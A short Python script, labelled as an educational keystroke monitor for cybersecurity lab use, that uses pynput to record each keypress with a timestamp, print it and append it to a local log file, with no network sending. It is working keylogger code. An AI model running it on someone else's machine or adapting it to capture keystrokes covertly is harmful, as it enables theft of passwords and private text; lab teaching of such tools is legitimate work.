# Educational keystroke monitoring script
# Developed for ethical cybersecurity lab use only

from pynput.keyboard import Key, Listener
import datetime

def on_press(key):
    # Capture timestamp for analysis and logging
    timestamp = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    try:
        log_entry = f"[{timestamp}] {key.char}"
    except AttributeError:
        log_entry = f"[{timestamp}] {key}"

    # Print output for transparency during execution
    print(log_entry)

    # Write keystrokes locally (no network transmission)
    with open("keystroke_log_lab.txt", "a") as f:
        f.write(log_entry + "\n")

# Listener runs only while script is active
with Listener(on_press=on_press) as listener:
    listener.join()
